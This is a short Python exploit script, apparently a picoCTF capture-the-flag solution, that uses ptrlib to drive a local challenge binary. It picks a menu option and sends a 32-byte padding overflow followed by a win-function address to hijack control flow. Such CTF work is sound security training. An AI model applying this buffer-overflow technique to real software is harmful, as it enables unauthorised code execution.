#!/usr/bin/env python

# import pwn
import ptrlib as ptr

io = ptr.Process("./chall")
# io = ptr.Socket("mimas.picoctf.net", 51998)

win_addr = 0x00000000004011A0

io.recvuntil(b"Enter your choice: ")
io.sendline(b"2")
io.sendline(b"A" * 32 + ptr.p64(win_addr))
io.sendline(b"4")

print(io.recvlineafter(b"Enter your choice:"))
